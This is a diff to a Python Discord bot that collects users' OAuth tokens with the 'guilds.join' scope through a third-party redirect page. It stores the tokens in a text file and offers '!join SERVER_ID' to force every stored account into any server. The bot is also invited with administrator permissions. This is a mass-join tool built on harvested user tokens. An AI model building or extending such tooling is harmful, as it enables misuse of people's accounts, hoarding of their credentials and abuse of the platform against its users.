@@ -5,6 +5,7 @@ import os
 import asyncio
 from discord.ext import commands
 import time
+from urllib.parse import urlencode
 
 print("🚀 STARTING BOT...")
 
@@ -36,6 +37,14 @@ bot.remove_command("help")
 @bot.event
 async def on_ready():
     print(f'🎯 Bot is ready: {bot.user}')
+    print(f'📋 Loaded commands: {[command.name for command in bot.commands]}')
+
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.CommandNotFound):
+        await ctx.send(f"❌ Command not found. Use `!help` to see available commands.")
+    else:
+        print(f"❌ Command error: {error}")
 
 def refresh_access_token(refresh_token):
     """Refresh an expired access token"""
@@ -113,6 +122,54 @@ def update_token_in_file(user_id, new_access_token, new_refresh_token):
     except Exception as e:
         print(f"❌ Error updating tokens in file: {e}")
         return False
+
+@bot.command(name='get_token')
+async def get_auth_token(ctx):
+    """Get authentication link - FIXED VERSION"""
+    try:
+        redirect_url = "https://parrotgames.free.nf/discord-redirect.html"
+        
+        # CORRECTED SCOPES
+        scopes = "identify guilds.join"
+        
+        auth_params = {
+            'client_id': CLIENT_ID,
+            'response_type': 'code',
+            'redirect_uri': redirect_url,
+            'scope': scopes,
+            'prompt': 'consent'
+        }
+        
+        # Build URL properly
+        oauth_url = f"https://discord.com/oauth2/authorize?{urlencode(auth_params)}"
+        
+        embed = discord.Embed(
+            title="🔐 Authentication Required",
+            description="**Click the link below to get your authentication code:**",
+            color=0x5865F2
+        )
+        embed.add_field(
+            name="🚨 IMPORTANT",
+            value="**Codes expire in 10 minutes!** Complete authentication quickly.",
+            inline=False
+        )
+        embed.add_field(
+            name="🔗 Auth Link", 
+            value=f"[**👉 CLICK HERE TO AUTHENTICATE 👈**]({oauth_url})",
+            inline=False
+        )
+        embed.add_field(
+            name="📝 Steps:",
+            value="1. Click the link above\n2. Authorize the application\n3. **IMMEDIATELY** copy the code\n4. Use `!auth YOUR_CODE_HERE`",
+            inline=False
+        )
+        
+        await ctx.send(embed=embed)
+        print(f"✅ Sent auth link to {ctx.author.name}")
+        
+    except Exception as e:
+        await ctx.send(f"❌ Error generating auth link: {str(e)}")
+        print(f"❌ Error in get_token: {e}")
 
 @bot.command(name='auth')
 async def authenticate_user(ctx, authorization_code: str):
@@ -402,34 +459,155 @@ async def check_token_validity(ctx):
     except Exception as error:
         await ctx.send(f"❌ Error checking tokens: {str(error)}")
 
-# Keep all your other commands (get_token, invite, list_users, etc.) the same
-# ... [rest of your existing commands remain unchanged]
+@bot.command(name='list_users')
+async def list_authenticated_users(ctx):
+    """List all authenticated users"""
+    try:
+        if not os.path.exists('auths.txt'):
+            await ctx.send("❌ No users are authenticated yet.")
+            return
+        
+        users = []
+        with open('auths.txt', 'r') as auth_file:
+            for line_num, line in enumerate(auth_file, 1):
+                line = line.strip()
+                if not line:
+                    continue
+                    
+                parts = line.split(',')
+                if len(parts) >= 3:
+                    user_id = parts[0]
+                    token_preview = parts[1][:10] + "..." if len(parts[1]) > 10 else parts[1]
+                    users.append(f"`{line_num}.` <@{user_id}> - `{token_preview}`")
+        
+        if not users:
+            await ctx.send("❌ No valid authenticated users found.")
+            return
+        
+        embed = discord.Embed(
+            title="📋 AUTHENTICATED USERS",
+            description=f"**Total: {len(users)} users**",
+            color=0x5865F2
+        )
+        
+        # Split users into chunks to avoid field length limits
+        users_text = "\n".join(users[:20])  # Show first 20 users
+        if len(users) > 20:
+            users_text += f"\n\n... and {len(users) - 20} more users"
+        
+        embed.add_field(name="Users", value=users_text, inline=False)
+        embed.add_field(
+            name="Usage", 
+            value=f"Use `!join SERVER_ID` to add all {len(users)} users to a server", 
+            inline=False
+        )
+        
+        await ctx.send(embed=embed)
+        
+    except Exception as error:
+        await ctx.send(f"❌ Error listing users: {str(error)}")
 
-@bot.command(name='help')
-async def show_help(ctx):
-    """Show commands"""
+@bot.command(name='clear_users')
+async def clear_authenticated_users(ctx):
+    """Clear all authenticated users (reset)"""
+    try:
+        if os.path.exists('auths.txt'):
+            # Count users before clearing
+            user_count = 0
+            with open('auths.txt', 'r') as auth_file:
+                for line in auth_file:
+                    if line.strip():
+                        user_count += 1
+            
+            os.remove('auths.txt')
+            await ctx.send(f"✅ Cleared **{user_count}** authenticated users. File reset.")
+        else:
+            await ctx.send("✅ No auth file found. Already clean.")
+            
+    except Exception as error:
+        await ctx.send(f"❌ Error clearing users: {str(error)}")
+
+@bot.command(name='invite')
+async def generate_invite(ctx):
+    """Generate bot invite link for any server"""
+    invite_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&permissions=8&scope=bot%20applications.commands"
+    
     embed = discord.Embed(
-        title="🤖 BOT COMMANDS - IMPROVED MASS JOIN SYSTEM",
+        title="🤖 BOT INVITE LINK",
+        description="**Use this link to add the bot to any server:**",
         color=0x5865F2
     )
     embed.add_field(
-        name="🔐 AUTHENTICATION", 
-        value="`!get_token` - Get auth link\n`!auth CODE` - Users auth themselves\n`!check_tokens` - Check token validity", 
+        name="🔗 Invite Link", 
+        value=f"[**👉 CLICK HERE TO INVITE BOT 👈**]({invite_url})",
         inline=False
     )
+    
+    await ctx.send(embed=embed)
+
+@bot.command(name='servers')
+async def list_servers(ctx):
+    """List all servers the bot is in"""
+    try:
+        if not bot.guilds:
+            await ctx.send("❌ Bot is not in any servers.")
+            return
+        
+        server_list = []
+        for guild in bot.guilds:
+            server_list.append(f"`{guild.id}` - **{guild.name}** (Members: {guild.member_count})")
+        
+        embed = discord.Embed(
+            title="🏠 BOT SERVERS",
+            description=f"**Total: {len(bot.guilds)} servers**",
+            color=0x5865F2
+        )
+        
+        servers_text = "\n".join(server_list[:15])
+        if len(server_list) > 15:
+            servers_text += f"\n... and {len(server_list) - 15} more servers"
+        
+        embed.add_field(name="Servers", value=servers_text, inline=False)
+        embed.add_field(
+            name="Usage", 
+            value="Use `!join SERVER_ID` to add users to a server", 
+            inline=False
+        )
+        
+        await ctx.send(embed=embed)
+        
+    except Exception as error:
+        await ctx.send(f"❌ Error listing servers: {str(error)}")
+
+@bot.command(name='help')
+async def show_help(ctx):
+    """Show all available commands"""
+    embed = discord.Embed(
+        title="🤖 BOT COMMANDS - COMPLETE LIST",
+        color=0x5865F2
+    )
+    
     embed.add_field(
-        name="🚀 MASS SERVER JOINING", 
-        value="`!join SERVER_ID` - Add ALL auth users (with auto-token refresh)\n`!add_user USER_ID SERVER_ID` - Add specific user", 
+        name="🔐 AUTHENTICATION", 
+        value="`!get_token` - Get authentication link\n`!auth CODE` - Authenticate with code\n`!check_tokens` - Check token validity", 
         inline=False
     )
+    
+    embed.add_field(
+        name="🚀 MASS JOINING", 
+        value="`!join SERVER_ID` - Add ALL users to server\n`!servers` - List bot servers", 
+        inline=False
+    )
+    
     embed.add_field(
         name="👥 USER MANAGEMENT", 
-        value="`!list_users` - List all auth users\n`!clear_users` - Reset all auth users", 
+        value="`!list_users` - List authenticated users\n`!clear_users` - Reset all users", 
         inline=False
     )
+    
     embed.add_field(
-        name="🛠 IMPROVEMENTS", 
-        value="• **Auto token refresh** before joining\n• **Better error handling**\n• **Reduced rate limiting**\n• **Token validity checking**", 
+        name="🔧 UTILITY", 
+        value="`!invite` - Get bot invite link\n`!help` - Show this help", 
         inline=False
     )
     
@@ -437,5 +615,8 @@ async def show_help(ctx):
 
 # START BOT
 if __name__ == "__main__":
-    print("🎯 STARTING IMPROVED DISCORD BOT...")
-    bot.run(BOT_TOKEN)
+    print("🎯 STARTING COMPLETE DISCORD BOT...")
+    try:
+        bot.run(BOT_TOKEN)
+    except Exception as e:
+        print(f"❌ Failed to start bot: {e}")
